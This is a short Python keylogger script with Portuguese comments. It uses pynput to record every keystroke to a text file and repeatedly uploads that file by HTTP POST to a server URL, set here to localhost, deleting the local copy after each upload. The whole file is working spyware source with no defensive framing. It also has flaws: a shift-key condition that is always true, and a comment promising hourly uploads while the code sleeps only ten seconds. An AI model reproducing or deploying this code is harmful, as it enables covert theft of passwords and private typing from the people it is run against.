import os
import shutil
import requests
import time
from pynput.keyboard import Key, Listener

log_file = "key_log.txt"
backup_file = "key_log_backup.txt"
server_url = "http://127.0.0.1:5000/upload"

def verificar_criar_arquivo():
    """Verifica se o arquivo de log existe, se não, cria um arquivo vazio"""
    if not os.path.exists(log_file):
        with open(log_file, 'w'):  # Cria o arquivo vazio
            pass

def enviar_dados():
    """Função para enviar o arquivo de log para o servidor"""
    verificar_criar_arquivo()  # Garante que o arquivo exista antes de tentar copiá-lo
    shutil.copy(log_file, backup_file)

    with open(log_file, 'rb') as f:
        files = {'file': (log_file, f, 'text/plain')}
        try:
            response = requests.post(server_url, files=files)
            if response.status_code == 200:
                print("Dados enviados com sucesso.")
                os.remove(log_file)  # Remove o arquivo de log após o envio
            else:
                print(f"Falha no envio. Código de status: {response.status_code}")
        except Exception as e:
            print(f"Falha ao enviar os dados: {e}")

def on_press(key):
    """Função chamada quando uma tecla é pressionada"""
    try:
        with open(log_file, "a") as log:
            # Verifica se a tecla é alfanumérica ou especial
            if hasattr(key, 'char') and key.char is not None:  # Teclas alfanuméricas
                log.write(key.char)
            elif key == Key.backspace:  # Tecla Backspace
                log.write('\\')  # Registrando como um caractere específico
            elif key == Key.space:
                log.write(' ')
            elif key == Key.enter:
                log.write('\n')
            elif key == Key.shift_l or Key.shift_r:
                log.write('')
            else:
                log.write(f'[{key}]')  # Para outras teclas especiais
    except AttributeError:
        # Caso não seja uma tecla reconhecível (ex: teclas de controle)
        with open(log_file, "a") as log:
            log.write(f'[{key}]')

def iniciar_envio_periodico():
    """Função para enviar os dados a cada 1 hora"""
    while True:
        enviar_dados()  # Envia os dados
        print("Aguardando 1 hora para o próximo envio...")
        time.sleep(10)  # Espera 1 hora (3600 segundos)

# Iniciar o listener para capturar as teclas pressionadas em segundo plano
listener = Listener(on_press=on_press)
listener.start()

# Iniciar o envio periódico de dados de hora em hora
iniciar_envio_periodico()
